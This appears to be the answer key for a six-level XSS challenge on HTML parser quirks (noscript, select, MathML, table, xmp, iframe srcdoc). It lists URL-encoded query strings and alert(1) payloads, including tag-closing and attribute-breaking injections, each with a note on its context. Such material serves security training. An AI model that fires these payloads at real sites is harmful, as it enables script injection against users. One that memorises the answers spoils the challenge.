# pdiff — solutions

Parser differential contexts: noscript, foster parenting, MathML, xmp, srcdoc.

### pdiff-level1

`/pdiff/level1/?query=%3C%2Fnoscript%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E`

- payload: `</noscript><img src=x onerror=alert(1)>`
- context: <noscript> contents executed when JS enabled after close

### pdiff-level2

`/pdiff/level2/?query=%3Csvg%20onload%3Dalert(1)%3E`

- payload: `<svg onload=alert(1)>`
- context: unclosed <select><option>; tag injected after option text

### pdiff-level3

`/pdiff/level3/?query=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: inside <math><mi>; HTML integration point parses tags

### pdiff-level4

`/pdiff/level4/?query=%3Csvg%20onload%3Dalert(1)%3E`

- payload: `<svg onload=alert(1)>`
- context: inside unclosed <table><tr><td>; raw tag reflection

### pdiff-level5

`/pdiff/level5/?query=%3C%2Fxmp%3E%3Csvg%20onload%3Dalert(1)%3E`

- payload: `</xmp><svg onload=alert(1)>`
- context: <xmp> is raw-text; must close it to inject

### pdiff-level6

`/pdiff/level6/?query=%3Cscript%3Ealert(1)%3C%2Fscript%3E`

- payload: `<script>alert(1)</script>`
- context: <iframe srcdoc="QUERY"> double-quoted, but `<` raw inside srcdoc attr ‒ browser entity-decode required

Note: srcdoc value must be HTML-entity-encoded for `<`; alternative attribute-break payload:

- alt-payload: `"><svg onload=alert(1)>` (URL: `/pdiff/level6/?query=%22%3E%3Csvg%20onload%3Dalert(1)%3E`)
- alt-context: break out of srcdoc attribute into iframe parent
